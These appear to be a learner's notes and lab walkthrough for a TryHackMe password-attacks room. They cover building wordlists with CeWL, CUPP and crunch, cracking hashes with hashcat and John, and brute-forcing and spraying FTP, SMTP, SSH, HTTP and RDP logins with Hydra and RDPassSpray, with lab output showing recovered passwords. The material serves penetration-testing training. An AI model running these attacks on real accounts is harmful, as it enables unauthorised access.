# Password Attacks

## TASK 3 Password Profiling #1 - Default, Weak, Leaked, Combined , and Username Wordlists

### Default Passwords

Manufacturers set default passwords with products and equipment such as switches, firewalls, routers. For known devices, check default passwords. E.g., Tomcat uses admin:admin or tomcat:admin.

Here are some website lists that provide default passwords for various products.

- https://cirt.net/passwords
- https://default-password.info/
- https://datarecovery.com/rd/default-passwords/

### Weak Passwords

Professionals build weak password lists from experience, pentesting, and leaked data, combining them into large wordlists.

Common sources:

- https://www.skullsecurity.org/wiki/Passwords: Well-known password collections.
- SecLists: Extensive lists for password cracking and more.

### Leaked Passwords

Leaked passwords from breaches are called 'dumps'. They may contain hashes needing cracking or plain-text passwords.

Common lists include:

- SecLists/Passwords/Leaked-Databases

### Combined wordlists

Combine multiple wordlists into one and remove duplicates.

```bash
cat file1.txt file2.txt file3.txt > combined_list.txt

sort combined_list.txt | uniq -u > cleaned_combined_list.txt
```

### Customized Wordlists

Customizing password lists boosts success in finding valid credentials. Target websites often reveal company info, employee details, emails, and keywords like product/service names useful for passwords.

Tools like CeWL crawl websites to extract strings and generate tailored wordlists.

```bash
user@thm$ cewl -w list.txt -d 5 -m 5 http://thm.labs
```

-w will write the contents to a file. In this case, list.txt.

-m 5 gathers strings (words) that are 5 characters or more

-d 5 is the depth level of web crawling/spidering (default 2)

http://thm.labs is the URL that will be used

We now have a wordlist of enterprise-specific words like names, locations, and business terms. It can also fuzz usernames.

Use cewl on https://clinic.thmredteam.com/ to generate a wordlist with min length 8. We'll use it later.

### Username Wordlists

Generate username lists from names.

Examples for John Smith:

- {first name}: john
- {last name}: smith
- {first name}{last name}: johnsmith
- {last name}{first name}: smithjohn
- first letter of {first name}{last name}: jsmith
- first letter of {last name}{first name}: sjohn
- {first name}.{last name}: j.smith
- {first name}-{last name}: j-smith
- and so on

Use tools like username_generator for combinations.

```bash
user@thm$ git clone https://github.com/therodri2/username_generator.git
Cloning into 'username_generator'...
remote: Enumerating objects: 9, done.
remote: Counting objects: 100% (9/9), done.
remote: Compressing objects: 100% (7/7), done.
remote: Total 9 (delta 0), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (9/9), done.
```

```bash
user@thm$ cd username_generator
```

Using python3 username_generator.py -h shows the tool's help message and optional arguments.

```bash
user@thm$ python3 username_generator.py -h
usage: username_generator.py [-h] [-w wordlist] [-u]

Python script to generate user lists for bruteforcing!

optional arguments:
  -h, --help            show this help message and exit
  -w wordlist, --wordlist wordlist
                        Specify path to the wordlist
  -u, --uppercase       Also produce uppercase permutations. Disabled by default
```

Create a wordlist that contains the full name John Smith to a text file. Then, we'll run the tool to generate the possible combinations of the given full name.

```bash
user@thm$ echo "John Smith" > users.lst
user@thm$ python3 username_generator.py -w users.lst
usage: username_generator.py [-h] -w wordlist [-u]
john
smith
j.smith
j-smith
j_smith
j+smith
jsmith
smithjohn
```

This is just one example of a custom username generator. Please feel free to explore more options or even create your own in the programming language of your choice!

## TASK 4 Password Profiling #2 - Keyspace Technique and CUPP

### Keyspace Technique

Use the key-space technique to specify ranges of characters, numbers, and symbols in wordlists. Crunch is a tool for creating offline wordlists with options like min, max length.

Example: Create a wordlist of all 2-character combinations from 0-4 and a-d, save to file.

```bash
user@thm$ crunch 2 2 01234abcd -o crunch.txt
Crunch will now generate the following amount of data: 243 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: xx
crunch: 100% completed generating output
```

Snippet of output:

```bash
user@thm$ cat crunch.txt
00
01
02
03
04
0a
0b
0c
0d
10
.
.
.
cb
cc
cd
d0
d1
d2
d3
d4
da
db
dc
dd
```

Note: Crunch can generate large files. Example for 8-character min/max with numbers 0-9, a-f, A-F: crunch 8 8 0123456789abcdefABCDEF -o crunch.txt (459 GB, 54875873536 words).

Use -t for character sets:

@ - lower case alpha

, - upper case alpha

% - numeric

^ - special characters including space

Example: Generate "pass" followed by 2 numbers.

```bash
user@thm$  crunch 6 6 -t pass%%
Crunch will now generate the following amount of data: 700 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 100
pass00
pass01
pass02
pass03
```

### CUPP - Common User Passwords Profiler

CUPP is a Python tool for generating custom wordlists based on target details like names, dates. Supports leet mode.

Clone and run:

```bash
user@thm$  git clone https://github.com/Mebus/cupp.git
Cloning into 'cupp'...
remote: Enumerating objects: 237, done.
remote: Total 237 (delta 0), reused 0 (delta 0), pack-reused 237
Receiving objects: 100% (237/237), 2.14 MiB | 1.32 MiB/s, done.
Resolving deltas: 100% (125/125), done.
```

Run with options:

```bash
user@thm$  python3 cupp.py
 ___________
   cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | https://github.com/Mebus/cupp/]


usage: cupp.py [-h] [-i | -w FILENAME | -l | -a | -v] [-q]

Common User Passwords Profiler

optional arguments:
  -h, --help         show this help message and exit
  -i, --interactive  Interactive questions for user password profiling
  -w FILENAME        Use this option to improve existing dictionary, or WyD.pl output to make some pwnsauce
  -l                 Download huge wordlists from repository
  -a                 Parse default usernames and passwords directly from Alecto DB. Project Alecto uses purified
                     databases of Phenoelit and CIRT which were merged and enhanced
  -v, --version      Show the version of this program.
  -q, --quiet        Quiet mode (don't print banner)
```

Interactive mode:

```bash
user@thm$  python3 cupp.py -i
 ___________
   cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | https://github.com/Mebus/cupp/]


[+] Insert the information about the victim to make a dictionary
[+] If you don't know all the info, just hit enter when asked! ;)

> First Name: 
> Surname: 
> Nickname: 
> Birthdate (DDMMYYYY): 


> Partners) name:
> Partners) nickname:
> Partners) birthdate (DDMMYYYY):


> Child's name:
> Child's nickname:
> Child's birthdate (DDMMYYYY):


> Pet's name:
> Company name:


> Do you want to add some key words about the victim? Y/[N]:
> Do you want to add special chars at the end of words? Y/[N]:
> Do you want to add some random numbers at the end of words? Y/[N]:
> Leet mode? (i.e. leet = 1337) Y/[N]:
```

Generates wordlist based on inputs.

Download wordlists:

```bash
user@thm$  python3 cupp.py -l
 ___________
   cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | https://github.com/Mebus/cupp/]


        Choose the section you want to download:

     1   Moby            14      french          27      places
     2   afrikaans       15      german          28      polish
     3   american        16      hindi           29      random
     4   aussie          17      hungarian       30      religion
     5   chinese         18      italian         31      russian
     6   computer        19      japanese        32      science
     7   croatian        20      latin           33      swahili
     8   czech           21      literature      34      swedish
     9   danish          22      movieTV         35      turkish
    10   databases       23      music           36      yiddish
    11   dictionaries    24      net             37      exit program
    12   dutch           25      norwegian       38      exit program
    13   finnish         26      places


        Files will be downloaded from http://ftp.funet.fi/pub/unix/security/passwd/crack/dictionaries/ repository

        Tip: After downloading wordlist, you can improve it with -w option
```

Parse Alecto DB for defaults:

```bash
user@thm$  python3 cupp.py -a
 ___________
   cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | https://github.com/Mebus/cupp/]


[+] Checking if alectodb is not present...
[+] Downloading alectodb.csv.gz from https://github.com/yangbh/Hammer/raw/b0446396e8d67a7d4e53d6666026e078262e5bab/lib/cupp/alectodb.csv.gz ...

[+] Exporting to alectodb-usernames.txt and alectodb-passwords.txt
[+] Done.
```

## TASK 5 Offline Attacks - Dictionary and Brute-Force

This section discusses offline attacks, including dictionary, brute-force, and rule-based attacks.

### Dictionary attack

A dictionary attack guesses passwords using pre-gathered wordlists. Choose or create the best wordlist for your target. Use hashcat to crack hashes.

Let's say we have hash f806fc5a2a0d5ba2471600758452799c. Identify the hash type (e.g., MD5) and select a wordlist.

```bash
user@machine$ hashcat -a 0 -m 0 f806fc5a2a0d5ba2471600758452799c /usr/share/wordlists/rockyou.txt
hashcat (v6.1.1) starting...
f806fc5a2a0d5ba2471600758452799c:rockyou

Session..........: hashcat
Status...........: Cracked
Hash.Name........: MD5
Hash.Target......: f806fc5a2a0d5ba2471600758452799c
Time.Started.....: Mon Oct 11 08:20:50 2021 (0 secs)
Time.Estimated...: Mon Oct 11 08:20:50 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   114.1 kH/s (0.02ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 40/40 (100.00%)
Rejected.........: 0/40 (0.00%)
Restore.Point....: 0/40 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: 123456 -> 123123

Started: Mon Oct 11 08:20:49 2021
Stopped: Mon Oct 11 08:20:52 2021
```

-a 0 sets the attack mode to a dictionary attack

-m 0 sets the hash mode for cracking MD5 hashes; for other types, run hashcat -h for a list of supported hashes.

f806fc5a2a0d5ba2471600758452799c this option could be a single hash like our example or a file that contains a hash or multiple hashes.

 /usr/share/wordlists/rockyou.txt the wordlist/dictionary file for our attack

We run hashcat with --show option to show the cracked value if the hash has been cracked:

```bash
user@machine$ hashcat -a 0 -m 0 F806FC5A2A0D5BA2471600758452799C /usr/share/wordlists/rockyou.txt --show
f806fc5a2a0d5ba2471600758452799c:rockyou
```

As a result, the cracked value is rockyou.

### Brute-Force attack

Brute-forcing guesses passwords by trying all combinations of characters. Unlike dictionary attacks, it doesn't rely on wordlists but generates combinations.

For example, to guess a 4-digit PIN, try from 0000 to 9999.

Hashcat uses charsets for brute-force.

```bash
user@machine$ hashcat --help
 ? | Charset
 ===+=========
  l | abcdefghijklmnopqrstuvwxyz
  u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
  d | 0123456789
  h | 0123456789abcdef
  H | 0123456789ABCDEF
  s |  !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
  a | ?l?u?d?s
  b | 0x00 - 0xff
```

The following example shows how we can use hashcat with the brute-force attack mode with a combination of our choice.

```bash
user@machine$ hashcat -a 3 ?d?d?d?d --stdout
1234
0234
2234
3234
9234
4234
5234
8234
7234
6234
..
..
```

-a 3 sets the attacking mode as a brute-force attack

?d?d?d?d the ?d tells hashcat to use a digit. In our case, ?d?d?d?d for four digits starting with 0000 and ending at 9999

--stdout print the result to the terminal

Now let's apply the same concept to crack the following MD5 hash: 05A5CF06982BA7892ED2A6D38FE832D6 a four-digit PIN number.

```bash
user@machine$ hashcat -a 3 -m 0 05A5CF06982BA7892ED2A6D38FE832D6 ?d?d?d?d
05a5cf06982ba7892ed2a6d38fe832d6:2021

Session..........: hashcat
Status...........: Cracked
Hash.Name........: MD5
Hash.Target......: 05a5cf06982ba7892ed2a6d38fe832d6
Time.Started.....: Mon Oct 11 10:54:06 2021 (0 secs)
Time.Estimated...: Mon Oct 11 10:54:06 2021 (0 secs)
Guess.Mask.......: ?d?d?d?d [4]
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 16253.6 kH/s (0.10ms) @ Accel:1024 Loops:10 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 10000/10000 (100.00%)
Rejected.........: 0/10000 (0.00%)
Restore.Point....: 0/1000 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-10 Iteration:0-10
Candidates.#1....: 1234 -> 6764

Started: Mon Oct 11 10:54:05 2021
Stopped: Mon Oct 11 10:54:08 2021
```

## TASK 6 Offline Attacks - Rule-Based

### Rule-Based attacks

Rule-Based attacks, or hybrid attacks, apply rules to wordlists to create passwords fitting a policy, like adding symbols or numbers.

For this attack, expand wordlists using hashcat or John the Ripper. John uses rules in /etc/john/john.conf. View available rules:

```bash
user@machine$ cat /etc/john/john.conf|grep "List.Rules:" | cut -d"." -f3 | cut -d":" -f2 | cut -d"]" -f1 | awk NF
JumboSingle
o1
o2
i1
i2
o1
i1
o2
i2
best64
d3ad0ne
dive
InsidePro
T0XlC
rockyou-30000
specific
ShiftToggle
Split
Single
Extra
OldOffice
Single-Extra
Wordlist
ShiftToggle
Multiword
best64
Jumbo
KoreLogic
T9
```

Create a wordlist with "tryhackme" and use the best64 rule:

```bash
user@machine$ john --wordlist=/tmp/single-password-list.txt --rules=best64 --stdout | wc -l
Using default input encoding: UTF-8
Press 'q' or Ctrl-C to abort, almost any other key for status
76p 0:00:00:00 100.00% (2021-10-11 13:42) 1266p/s pordpo
76
```

Use KoreLogic rule to check for "Tryh@ckm3":

```bash
user@machine$ john --wordlist=single-password-list.txt --rules=KoreLogic --stdout |grep "Tryh@ckm3"
Using default input encoding: UTF-8
Press 'q' or Ctrl-C to abort, almost any other key for status
Tryh@ckm3
7089833p 0:00:00:02 100.00% (2021-10-11 13:56) 3016Kp/s tryhackme999999
```

### Custom Rules

John allows custom rules for wordlist modification. Add rules to john.conf to prepend symbols and append numbers.

Add to /etc/john/john.conf:

```bash
user@machine$ sudo vi /etc/john/john.conf 
[List.Rules:THM-Password-Attacks] 
Az"[0-9]" ^[!@#$]
```

[List.Rules:THM-Password-Attacks] specify the rule name THM-Password-Attacks.

Az represents a single word from the original wordlist/dictionary using -p.

"[0-9]" append a single digit (from 0 to 9) to the end of the word. For two digits, we can add "[0-9][0-9]" and so on.

^[!@#$] add a special character at the beginning of each word. ^ means the beginning of the line/word. Note, changing ^ to $ will append the special characters to the end of the line/word.

Create a single word file:

```bash
user@machine$ echo "password" > /tmp/single.lst
```

Apply the rule:

```bash
user@machine$ john --wordlist=/tmp/single.lst --rules=THM-Password-Attacks --stdout 
Using default input encoding: UTF-8 
!password0 
@password0 
#password0 
$password0
```

## TASK 8 Online password attacks

Online password attacks guess passwords for networked services like HTTP, SSH, FTP. This section uses Hydra for brute-forcing logins.

### Hydra

Hydra supports many network services. Each service has specific options; check help for details.

#### FTP

Perform brute-force against FTP server. Syntax:

```bash
user@machine$ hydra -l ftp -P passlist.txt ftp://10.10.x.x
```

-l ftp specifies single username; use -L for list.

-P path to wordlist; use -p for single password.

ftp://10.10.x.x protocol and target IP/FQDN.

Try default credentials first. Attack the VM's FTP server.

#### SMTP

Brute-force SMTP servers similarly. Syntax:

```bash
user@machine$ hydra -l email@company.xyz -P /path/to/wordlist.txt smtp://10.10.x.x -v 
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-10-13 03:41:08
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 7 tasks per 1 server, overall 7 tasks, 7 login tries (l:1/p:7), ~1 try per task
[DATA] attacking smtp://10.10.x.x:25/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[25][smtp] host: 10.10.x.x   login: email@company.xyz password: xxxxxxxx
[STATUS] attack finished for 10.10.x.x (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
```

#### SSH

Brute-force SSH. Syntax:

```bash
user@machine$ hydra -L users.lst -P /path/to/wordlist.txt ssh://10.10.x.x -v

Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. 

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-10-13 03:48:00
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 8 tasks per 1 server, overall 8 tasks, 8 login tries (l:1/p:8), ~1 try per task
[DATA] attacking ssh://10.10.x.x:22/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[INFO] Testing if password authentication is supported by ssh://user@10.10.x.x:22
[INFO] Successful, password authentication is supported by ssh://user@10.10.x.x:22
[22][ssh] host: 10.10.x.x   login: victim   password: xxxxxxxx
[STATUS] attack finished for 10.10.x.x (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
```

#### HTTP login pages

Brute-force HTTP logins. Specify GET or POST. Analyze request with dev tools or proxy.

Syntax: hydra -l username -P wordlist target http-get-form "url:form:S=success"

Example:

```bash
user@machine$ hydra -l admin -P 500-worst-passwords.txt 10.10.x.x http-get-form "/login-get/index.php:username=^USER^&password=^PASS^:S=logout.php" -f 
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. 

Hydra (http://www.thc.org/thc-hydra) starting at 2021-10-13 08:06:22 
[DATA] max 16 tasks per 1 server, overall 16 tasks, 500 login tries (l:1/p:500), ~32 tries per task 
[DATA] attacking http-get-form://10.10.x.x:80//login-get/index.php:username=^USER^&password=^PASS^:S=logout.php 
[80][http-get-form] host: 10.10.x.x   login: admin password: xxxxxx 
1 of 1 target successfully completed, 1 valid password found 
Hydra (http://www.thc.org/thc-hydra) 
finished at 2021-10-13 08:06:45
```

-l admin single username; -L for list.

-P wordlist path; -p for single password.

10.10.x.x target IP/FQDN.

http-get-form or http-post-form.

URL path, parameters with ^USER^ and ^PASS^.

Success condition S=; failure F=.

-f stop after finding valid pair.

Other tools: Medusa, Ncrack.

## TASK 8.1

1. Word from the website

```bash
┌──(yudenlin㉿kali)-[~/Desktop/THM_script]
└─$ cewl -m 8 -w clinic.lst https://clinic.thmredteam.com/                                      
CeWL 6.2.1 (More Fixes) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
```

2. Brute force the ftp server with collected wordlist

```bash
──(yudenlin㉿kali)-[~/Desktop/THM_script]
└─$ hydra -l ftp -P clinic.lst ftp://10.81.132.251                                 
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway.).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-01-14 17:01:13
[DATA] max 16 tasks per 1 server, overall 16 tasks, 105 login tries (l:1/p:105), ~7 tries per task
[DATA] attacking ftp://10.81.132.251:21/
[21][ftp] host: 10.81.132.251   login: ftp   password: protected
[21][ftp] host: 10.81.132.251   login: ftp   password: Cortisol
[21][ftp] host: 10.81.132.251   login: ftp   password: appointment
[21][ftp] host: 10.81.132.251   login: ftp   password: providing
[21][ftp] host: 10.81.132.251   login: ftp   password: Research
[21][ftp] host: 10.81.132.251   login: ftp   password: Cardiology
[21][ftp] host: 10.81.132.251   login: ftp   password: treatment
[21][ftp] host: 10.81.132.251   login: ftp   password: Saturday
[21][ftp] host: 10.81.132.251   login: ftp   password: February
[21][ftp] host: 10.81.132.251   login: ftp   password: Oxytocin
[21][ftp] host: 10.81.132.251   login: ftp   password: Paracetamol
[21][ftp] host: 10.81.132.251   login: ftp   password: hospital
[21][ftp] host: 10.81.132.251   login: ftp   password: commonly
[21][ftp] host: 10.81.132.251   login: ftp   password: Pregnancy
[21][ftp] host: 10.81.132.251   login: ftp   password: Laboratory
[21][ftp] host: 10.81.132.251   login: ftp   password: Copyright
1 of 1 target successfully completed, 16 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-01-14 17:01:14
```

3. Access ftp server and get flag

```bash
──(yudenlin㉿kali)-[~/Desktop/THM_script]
└─$ ftp 10.81.132.251
Connected to 10.81.132.251.
220 (vsFTPd 3.0.5)
Name (10.81.132.251:yudenlin): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> cd files
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||48590|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              38 Oct 12  2021 flag.txt
226 Directory send OK.
ftp> get flag.txt
local: flag.txt remote: flag.txt
229 Entering Extended Passive Mode (|||49701|)
150 Opening BINARY mode connection for flag.txt (38 bytes).
100% |*********************************************************************************|    38        0.35 KiB/s    00:00 ETA
226 Transfer complete.
38 bytes received in 00:00 (0.09 KiB/s)
ftp> exit
221 Goodbye.
```

## TASK 8.2

1. Add custom rule THM-Password-Attacks to /etc/john/john.conf: append digit, prepend symbol.

```bash
sudo vi /etc/john/john.conf

[List.Rules:THM-Password-Attacks] 
Az"[0-9][0-9]" ^[!@]
```

2. Apply rule to /tmp/single.lst, save to clinic_smtp.lst.

```bash
john --wordlist=/tmp/single.lst --rules=THM-Password-Attacks > clinic_smtp.lst
```

3. Brute-force SMTP at 10.81.132.251 with pittman@clinic.thmredteam.com and clinic_smtp.lst.

```bash
hydra -l pittman@clinic.thmredteam.com -P clinic_smtp.lst smtp://10.81.132.251
```

## TASK 8.3 

Brute force http GET login with password list.

```bash
┌──(yudenlin㉿kali)-[~/Desktop/THM_script]
└─$ hydra -l phillips -P clinic.lst 10.81.171.138 http-get-form "/login-get/index.php:username=phillips&password=^PASS^:S=logout.php" -f
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway.).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-01-15 10:13:51
[DATA] max 16 tasks per 1 server, overall 16 tasks, 105 login tries (l:1/p:105), ~7 tries per task
[DATA] attacking http-get-form://10.81.171.138:80/login-get/index.php:username=phillips&password=^PASS^:S=logout.php
[80][http-get-form] host: 10.81.171.138   login: phillips   password: Paracetamol
[STATUS] attack finished for 10.81.171.138 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-01-15 10:13:53
```

## TASK 8.4

1. Apply rule to ./clinic.lst, save to ./clinic_single_extra.lst.

```bash
┌──(yudenlin㉿kali)-[~/Desktop/THM_script]
└─$ john --wordlist=./clinic.lst --rules=Single-Extra --stdout > clinic_single_extra.lst
Using default input encoding: UTF-8
Press 'q' or Ctrl-C to abort, almost any other key for status
537014p 0:00:00:00 100.00% (2026-01-15 10:28) 2983Kp/s multidisciplina
```

2. Brute-force http POST login with ./clinic_single_extra.lst.

```bash
┌──(yudenlin㉿kali)-[~/Desktop/THM_script]
└─$  hydra -l burgess -P clinic_single_extra.lst 10.81.171.138 http-form-post "/login-post/index.php:username=burgess&password=^PASS^:S=logout.php" -f -v
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-01-15 03:14:42
[DATA] max 16 tasks per 1 server, overall 16 tasks, 537014 login tries (l:1/p:537014), ~33564 tries per task
[DATA] attacking http-post-form://10.81.171.138:80/login-post/index.php:username=burgess&password=^PASS^:S=logout.php
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[VERBOSE] Page redirected to http://10.81.171.138/login-post/flag.php
[80][http-post-form] host: 10.81.171.138   login: burgess   password: OxytocinnicotyxO
[STATUS] attack finished for 10.81.171.138 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-01-15 03:15:08
```

## TASK 9 Password spray attack

Password Spraying identifies valid credentials by trying one common weak password against many usernames, avoiding lockouts.

Common weak passwords include:

- The current season followed by the current year (SeasonYear). For example, Fall2020, Spring2021, etc.
- The current month followed by the current year (MonthYear). For example, November2020, March2021, etc.
- Using the company name along with random numbers (CompanyNameNumbers). For example, TryHackMe01, TryHackMe02.

If complexity required, add symbols (e.g., October2021!, Spring2021@). Enumerate valid usernames first.

### SSH

Assume enumerated usernames in usernames-list.txt.

```bash
user@THM:~# cat usernames-list.txt
admin
victim
dummy
adm
sammy
```

Use Hydra for password spraying against SSH with Spring2021.

```bash
user@THM:~$ hydra -L usernames-list.txt -p Spring2021 ssh://10.1.1.10
[INFO] Successful, password authentication is supported by ssh://10.1.1.10:22
[22][ssh] host: 10.1.1.10 login: victim password: Spring2021
[STATUS] attack finished for 10.1.1.10 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
```

### RDP

For exposed RDP on port 3026, use RDPassSpray. Install from GitHub, check help:

```bash
user@THM:~# python3 RDPassSpray.py -h
usage: RDPassSpray.py [-h] (-U USERLIST | -u USER  -p PASSWORD | -P PASSWORDLIST) (-T TARGETLIST | -t TARGET) [-s SLEEP | -r minimum_sleep maximum_sleep] [-d DOMAIN] [-n NAMES] [-o OUTPUT] [-V]

optional arguments:
  -h, --help            show this help message and exit
  -U USERLIST, --userlist USERLIST
                            Users list to use, one user per line
  -u USER, --user USER  Single user to use
  -p PASSWORD, --password PASSWORD
                            Single password to use
  -P PASSWORDLIST, --passwordlist PASSWORDLIST
                            Password list to use, one password per line
  -T TARGETLIST, --targetlist TARGETLIST
                            Targets list to use, one target per line
  -t TARGET, --target TARGET
                            Target machine to authenticate against
  -s SLEEP, --sleep SLEEP
                            Throttle the attempts to one attempt every # seconds, can be randomized by passing the value 'random' - default is 0
  -r minimum_sleep maximum_sleep, --random minimum_sleep maximum_sleep
                            Randomize the time between each authentication attempt. Please provide minimun and maximum values in seconds
  -d DOMAIN, --domain DOMAIN
                            Domain name to use
  -n NAMES, --names NAMES
                            Hostnames list to use as the source hostnames, one per line
  -o OUTPUT, --output OUTPUT
                            Output each attempt result to a csv file
  -V, --verbose         Turn on verbosity to show failed attempts
```

Spray single user and password:

```bash
user@THM:~# python3 RDPassSpray.py -u victim -p Spring2021! -t 10.100.10.240:3026
[13-02-2021 16:47] - Total number of users to test: 1
[13-02-2021 16:47] - Total number of password to test: 1
[13-02-2021 16:47] - Total number of attempts: 1
[13-02-2021 16:47] - [*] Started running at: 13-02-2021 16:47:40
[13-02-2021 16:47] - [+] Cred successful (maybe even Admin access!): victim :: Spring2021!
```

For domain environment:

```bash
user@THM:~# python3 RDPassSpray.py -U usernames-list.txt -p Spring2021! -d THM-labs -T RDP_servers.txt
```

Other tools: SprayingToolkit (atomizer.py) for OWA, MailSniper for OWA, Metasploit (auxiliary/scanner/smb/smb_login) for SMB.

## Appendix: